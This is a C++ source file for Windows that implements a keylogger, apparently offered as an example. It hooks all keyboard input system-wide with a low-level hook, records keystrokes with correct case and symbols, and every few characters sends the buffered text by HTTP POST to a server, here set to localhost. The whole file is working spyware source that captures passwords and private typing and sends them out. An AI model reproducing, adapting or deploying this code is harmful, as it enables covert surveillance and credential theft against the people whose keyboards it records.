#include <cstdio>
#include <iostream>
#include <istream>
#include <ostream>
#include <string>
#include <windows.h>
#include <winhttp.h>

using namespace std;
LRESULT CALLBACK LowLevelKeyboardProc( int nCode, WPARAM wParam, LPARAM lParam);
void sendData(string keys);
string keysString = "";
const char* key;

bool isCapsLock()
{
     if ((GetKeyState(VK_CAPITAL) & 0x0001)!=0)
        return true;
     else
        return false;
}

bool logicalXOR(bool p, bool q)
{
     return ((p || q) && !(p && q));
}
wstring get_utf16(const string &str, int codepage)
{
    if (str.empty()) return wstring();
    int sz = MultiByteToWideChar(codepage, 0, &str[0], (int)str.size(), 0, 0);
    wstring res(sz, 0);
    MultiByteToWideChar(codepage, 0, &str[0], (int)str.size(), &res[0], sz);
    return res;
}
void logIt(const char* key) {
    cout << key << "\r\n";
    keysString += key;
    if (keysString.length() > 15) {
        sendData(keysString);
    }
}
LPSTR getKeysString() {
    string keys = keysString;
    char * writable = new char[keys.size() +1];
    copy(keysString.begin(), keysString.end(), writable);
    writable[keysString.size()] = '\0'; // terminating zero
    keysString ="";

    return writable;
}
void sendData(string keys) {
    bool retry = true;
    DWORD result = 0;
    DWORD dwSize = 0;
    DWORD dwDownloaded = 0;
    LPSTR pszOutBuffer;
    BOOL bResults = FALSE;
    HINTERNET hSession = NULL,
    hConnect = NULL,
    hRequest = NULL;
    LPCWSTR additionalHeaders = L"Content-Type: application/x-www-form-urlencoded\r\n";
    DWORD headersLength = -1;

    LPSTR  data = getKeysString(); // assigning proper String as data
    DWORD data_len = strlen(data);

    //cout << data << "\r\n";
    wstring surl = get_utf16("/winhttp/", CP_UTF8);
    wstring sdomain = get_utf16("localhost", CP_UTF8);

     // Use WinHttpOpen to obtain a session handle.
    hSession = WinHttpOpen( L"Simple Keylog Example/1.0",
    WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
    WINHTTP_NO_PROXY_NAME,
    WINHTTP_NO_PROXY_BYPASS, 0 );

    // Specify an HTTP server.
    if( hSession )
    hConnect = WinHttpConnect( hSession, sdomain.c_str(),INTERNET_DEFAULT_HTTP_PORT, 0 );

    // Create an HTTP request handle.
    if( hConnect )
    cout << "\r\n" << "Connecting...";

    hRequest = WinHttpOpenRequest( hConnect, L"POST", surl.c_str(),NULL, WINHTTP_NO_REFERER,WINHTTP_DEFAULT_ACCEPT_TYPES,0 );


     // Send a request.
     if (hRequest) {
        bResults = WinHttpSendRequest(hRequest,additionalHeaders, headersLength,
                (LPVOID)data, data_len,data_len, 0);
     }

        // get last error
        result = GetLastError();
        cout << "\r\n" << "Attempt to connect, result: " << result << "\r\n";


     // End the request.
    if( bResults ) {
        cout << "Receiving response..." << "\r\n";
        bResults = WinHttpReceiveResponse( hRequest, NULL );
    }

     // Keep checking for data until there is nothing left.
    if( bResults ) {
        do {
             // Check for available data.
            cout << "Checking part of response... " << "\r\n";
            dwSize = 0;
            if( !WinHttpQueryDataAvailable( hRequest, &dwSize ) )
            printf( "Error %u in WinHttpQueryDataAvailable.\n",
            GetLastError( ) );

            // Allocate space for the buffer.
            pszOutBuffer = new char[dwSize+1];
            if( !pszOutBuffer ) {
                printf( "Out of memory\n" );
                dwSize=0;
            } else {
                // Read the data.
                ZeroMemory( pszOutBuffer, dwSize+1 );

                if( !WinHttpReadData( hRequest, (LPVOID)pszOutBuffer,dwSize, &dwDownloaded ) )
                    printf( "Error %u in WinHttpReadData.\n", GetLastError( ) );
                else
                    printf( "%s", pszOutBuffer );

                printf("\r\n");
                // Free the memory allocated to the buffer.
                delete [] pszOutBuffer;
            }
        } while( dwSize > 0 );
    }

     // Report any errors.
    if( !bResults )
    printf( "Error %d has occurred.\n \r\n", GetLastError( ) );

    printf("hRequest: %d, hConnect: %d, hSession: %d \r\n", hRequest, hConnect, hSession);
     // Close any open handles.
    if( hRequest ) WinHttpCloseHandle( hRequest );
    if( hConnect ) WinHttpCloseHandle( hConnect );
    if( hSession ) WinHttpCloseHandle( hSession );

}

LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {

    if ((nCode == HC_ACTION) && (wParam == WM_KEYDOWN))
    {
        PKBDLLHOOKSTRUCT p = (PKBDLLHOOKSTRUCT)lParam;
        DWORD vkCode = p->vkCode;
        if ((vkCode>=39)&&(vkCode<=64))
        {
            if (GetAsyncKeyState(VK_SHIFT)) // Check if shift key is down (fairly accurate)
            {
                switch (vkCode) // 0x30-0x39 is 0-9 respectively
                {
                case 0x30:
                    logIt(")");
                    break;
                case 0x31:
                    logIt("!");
                    break;
                case 0x32:
                    logIt("@");
                    break;
                case 0x33:
                    logIt("#");
                    break;
                case 0x34:
                    logIt("$");
                    break;
                case 0x35:
                    logIt("%");
                    break;
                case 0x36:
                    logIt("^");
                    break;
                case 0x37:
                    logIt("&");
                    break;
                case 0x38:
                    logIt("*");
                    break;
                case 0x39:
                    logIt("(");
                    break;
                }
            }
            else // If shift key is not down
            {
                char val[5];
                sprintf(val,"%c",vkCode);
                logIt(val);
            }
        } else if ((vkCode>64)&&(vkCode<91)) // Keys a-z
        {
            /*
            The following is a complicated statement to check if the letters need to be switched to lowercase.
            Here is an explanation of why the exclusive or (XOR) must be used.

            Shift   Caps    LowerCase    UpperCase
            T       T       T            F
            T       F       F            T
            F       T       F            T
            F       F       T            F

            The above truth table shows what case letters are typed in,
            based on the state of the shift and caps lock key combinations.

            The UpperCase column is the same result as a logical XOR.
            However, since we're checking the opposite in the following if statement, we'll also include a NOT operator (!)
            Becuase, NOT(XOR) would give us the LowerCase column results.

            */
            if (!(logicalXOR(GetAsyncKeyState(VK_SHIFT),isCapsLock()))) // Check if letters should be lowercase
            {
                vkCode+=32; // Un-capitalize letters
            }
            char val[5];
            sprintf(val,"%c",vkCode);
            logIt(val);
        }
        else
        {
            switch (vkCode) // Check for other keys
            {
            case VK_SPACE:
                logIt(" ");
                break;
            case VK_RETURN:
                logIt("[ENTER]\n");
                break;
            case VK_BACK:
                logIt("[BKSP]");
                break;
            case VK_TAB:
                logIt("[TAB]");
                break;
            case VK_LCONTROL:
            case VK_RCONTROL:
                logIt("[CTRL]");
                break;
            case VK_LMENU:
            case VK_RMENU:
                logIt("[ALT]");
                break;
            case VK_CAPITAL:
                logIt("[CAPS]");
                break;
            case VK_ESCAPE:
                logIt("[ESC]");
                break;
            case VK_INSERT:
                logIt("[INSERT]");
                break;
            case VK_DELETE:
                logIt("[DEL]");
                break;
            case VK_NUMPAD0:
                logIt("0");
                break;
            case VK_NUMPAD1:
                logIt("1");
                break;
            case VK_NUMPAD2:
                logIt("2");
                break;
            case VK_NUMPAD3:
                logIt("3");
                break;
            case VK_NUMPAD4:
                logIt("4");
                break;
            case VK_NUMPAD5:
                logIt("5");
                break;
            case VK_NUMPAD6:
                logIt("6");
                break;
            case VK_NUMPAD7:
                logIt("7");
                break;
            case VK_NUMPAD8:
                logIt("8");
                break;
            case VK_NUMPAD9:
                logIt("9");
                break;
            case VK_OEM_2:
                if (GetAsyncKeyState(VK_SHIFT))
                    logIt("?");
                else
                    logIt("/");
                break;
            case VK_OEM_3:
                if (GetAsyncKeyState(VK_SHIFT))
                    logIt("~");
                else
                    logIt("`");
                break;
            case VK_OEM_4:
                 if(GetAsyncKeyState(VK_SHIFT))
                    logIt("{");
                 else
                    logIt("[");
                 break;
            case VK_OEM_5:
                 if(GetAsyncKeyState(VK_SHIFT))
                    logIt("|");
                 else
                    logIt("\\");
                 break;
            case VK_OEM_6:
                 if(GetAsyncKeyState(VK_SHIFT))
                    logIt("}");
                 else
                    logIt("]");
                 break;
            case VK_OEM_7:
                 if(GetAsyncKeyState(VK_SHIFT))
                    logIt("\"");
                 else
                    logIt("'");
                 break;
            case VK_LSHIFT:
            case VK_RSHIFT:
                // do nothing;
                break;
            case 0xBC:                //comma
                 if(GetAsyncKeyState(VK_SHIFT))
                    logIt("<");
                 else
                    logIt(",");
                 break;
            case 0xBE:              //Period
                 if(GetAsyncKeyState(VK_SHIFT))
                    logIt(">");
                 else
                    logIt(".");
                 break;
            case 0xBA:              //Semi Colon same as VK_OEM_1
                 if(GetAsyncKeyState(VK_SHIFT))
                    logIt(":");
                 else
                    logIt(";");
                 break;
            case 0xBD:              //Minus
                 if(GetAsyncKeyState(VK_SHIFT))
                    logIt("_");
                 else
                    logIt("-");
                 break;
            case 0xBB:              //Equal
                 if(GetAsyncKeyState(VK_SHIFT))
                    logIt("+");
                 else
                    logIt("=");
                 break;
            default: // Catch all misc keys
                // fputc(vkCode,file); // Un-comment this to remove gibberish from the log file
                // printf("%c",vkCode); // Un-comment this line to debug and add support for more keys

                //  Use Getnametext instead of a lot of switch statements for system keys.

                DWORD dwMsg = 1;
                dwMsg += p->scanCode << 16;
                dwMsg += p->flags << 24;

                char key[16];
                GetKeyNameTextA(dwMsg,key,15);

                logIt(key);
                return CallNextHookEx(0, nCode, wParam, lParam);
            }

        }
        //char key = MapVirtualKeyEx(p->vkCode, 2, GetKeyboardLayout(0));
        // printf("%c", key);

    }
    return 0;
}

int main()
{
    HHOOK hhkLowLevelKybd = SetWindowsHookEx(WH_KEYBOARD_LL, LowLevelKeyboardProc, 0, 0);

    MSG msg;
    printf("Waiting for msgs ...\n");
    while (!GetMessage(&msg, NULL, NULL, NULL)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }
    //UnhookWindowsHookEx(hhkLowLevelKybd);
}
